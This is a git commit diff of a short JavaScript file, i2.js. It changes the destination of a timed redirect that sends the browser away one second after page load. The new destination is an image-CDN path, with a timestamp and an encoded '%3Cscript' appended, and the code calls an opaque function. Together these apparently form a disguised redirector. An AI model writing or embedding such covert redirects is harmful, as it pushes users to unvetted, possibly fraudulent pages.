78f4cf157ec7b70e0ac8bd47d7cca3cf9392509c
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-08 02:00:32 +0800

    Update i2.js

--- i2.js
+++ i2.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://cos.ap-shenzhen-fsi.tencentcos.cn/0-1322622902/waa.html?' + '?' + timestamp + '%3Cscript';
+    var url = 'https://meeting-75420.picgzc.qpic.cn/8f81703c1c76fe689f5ee64c0a059dd0bec71e7fbb6f7dbe6c4d74e1ca88260b' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
